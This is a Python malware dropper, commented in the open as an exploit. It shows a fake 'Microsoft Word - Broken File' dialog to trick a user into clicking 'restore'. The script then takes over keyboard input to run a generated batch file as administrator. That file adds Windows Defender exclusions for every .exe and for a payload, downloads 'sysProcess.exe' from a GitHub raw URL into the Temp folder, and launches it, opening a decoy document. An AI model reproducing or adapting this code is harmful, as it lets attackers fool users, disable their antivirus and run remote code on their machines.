import sys
import time
import requests
from pyautogui import  typewrite, hotkey
import pyautogui
pyautogui.FAILSAFE = False
import os
from PyQt5 import QtWidgets, uic, QtGui, QtCore
from PyQt5.QtCore import QCoreApplication, pyqtSignal


global path
path = os.path.dirname(os.path.abspath(__file__))
user = os.getlogin()

pathToTemp = rf"c:\Users\{os.getlogin()}\AppData\Local\Temp"
print(pathToTemp)

#Create .bat to exclude .exe from sandboxing
def makeExcetionScript():
    global path
    user = os.getlogin() #get user's folder's label
    pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"
    file = open(pathToTemp+'\FileRecover.bat', "w")
    enter = "\n"
    file.write(fr'''
                powershell.exe -Command Add-MpPreference -ExclusionExtension ".exe"{enter} #exclude every .exe file from Windows Defender 
                powershell.exe -Command Add-MpPreference -ExclusionPath "c:\Users\{user}\AppData\Temp\sysProcess.exe"{enter} #exclude the payload file from Windows Defender
                TIMEOUT 2{enter} #add delay (time needed for the payload to be downloaded)
                @start c:\Users\mathe\AppData\Local\Temp\sysProcess.exe{enter} #start payload as a new process
                "c:\Program\\Files\Microsoft Office\root\Office16\WINWORD.exe" /t "{path}\Document\\(1).docx"''') #open the docx file in word (if microsoft word is reachable)
    file.close()

#run the .bat script as admin by taking input control
def makeException(path):
    hotkey("win", "r")
    line = fr'%Temp%\FileRecover.bat' #path to script (compact format for launcher)
    typewrite(line) #search .bat script
    hotkey('ctrl', "shift", 'enter') #launch as admin (autorization needed)

def getPayload():
    user = os.getlogin() #get user's folder's label
    pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"
    os.chdir(pathToTemp) #move to temp folder
    link = "https://raw.githubusercontent.com/PetchouDev/payload/main/sysProcess.exe" #link to payload
    reponse = requests.get(link, allow_redirects=True) #download payload from github
    open("sysProcess.exe", 'wb').write(reponse.content) #write the payload

def getGUI():
    global path
    #list of files and links to download
    links = { "BrokenFile.ui" : "https://raw.githubusercontent.com/PetchouDev/payload/main/BrokenFile.ui", "word.png" : "https://raw.githubusercontent.com/PetchouDev/payload/main/word.png"}

    user = os.getlogin() #get user's folder's label
    pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"
    os.chdir(pathToTemp) # move to temp folder
    for link in links.keys():
        reponse = requests.get(links[link], allow_redirects=True) #download element
        open(link, 'wb').write(reponse.content) #write element into the corresponding file
    
    reponse = requests.get("https://raw.githubusercontent.com/PetchouDev/payload/main/BrokenFile", allow_redirects=True)
    open(path+r"\Document (1).docx", 'wb').write(reponse.content)

def isGUI():
    user = os.getlogin() #get user's folder's label
    pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"

    try:
        with open(pathToTemp+r"\word.png", "rb"):
            return True

    except:
        return False

"""
Start payload from python script - deprecated

def loadPayload():
    user = os.getlogin() #get user's folder's label
    pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"
    os.chdir(pathToTemp) #move to payload's folder
    os.system("@start sysProcess.exe") #start payload
"""

class Startup(QtWidgets.QMainWindow):
    window_closed = pyqtSignal()
    def __init__(self):
        
        super(Startup, self).__init__() # Call the inherited classes __init__ method
        os.getlogin() #get user's folder's label
        pathToTemp = rf"c:\Users\{user}\AppData\Local\Temp"
        uic.loadUi(pathToTemp+"/BrokenFile.ui", self) # Loads the .ui file
#set GUI components
        self.label_5.setText("Try to restore it (Administrator) ?")
        self.label.setPixmap(QtGui.QPixmap(pathToTemp+r"\word.png"))
        self.setWindowTitle("Microsoft Word - Broken File")
        self.pushButton.clicked.connect(self.restore)
        self.pushButton_2.clicked.connect(self.cancel)
#show the window
        self.show()
#abort if "no" button clicked
    def cancel(self):
        self.nextStep()
#start exploitation if "ok" button clicked
    def restore(self):
        self.nextStep()
        exploit()
#close the windows
    def nextStep(self):
        self.close()

#stop GUI appliation when window closed
    def closeWindow(self, event):
        self.window_closed.emit()
        event.accept()
        QCoreApplication.instance().quit()


def exploit():
    #launch bat script
    makeException(path)
    #start download/update task
    getPayload()


if __name__ == "__main__":
#Create the bat script if not found
    try:
        with open(pathToTemp+'\FileRecover.bat', "r"):
            print('exploit found')
            pass
    except :
        makeExcetionScript()
#Download GUI components if not found
    if not isGUI():
        print('GUI missing')
        getGUI()

#Create application instance for the GUI trap
    application = QtWidgets.QApplication(sys.argv)
#Add icon to application
    app_icon = QtGui.QIcon()
    app_icon.addFile(pathToTemp+"\word.png", QtCore.QSize(16,16))
    app_icon.addFile(pathToTemp+"\word.png", QtCore.QSize(24,24))
    app_icon.addFile(pathToTemp+"\word.png", QtCore.QSize(32,32))
    app_icon.addFile(pathToTemp+"\word.png", QtCore.QSize(48,48))
    app_icon.addFile(pathToTemp+"\word.png", QtCore.QSize(256,256))
    application.setWindowIcon(app_icon)
#add GUI to application
    window = Startup()
#Show GUI
    window.show()
    currentExitCode = application.exec_()
    application = None 


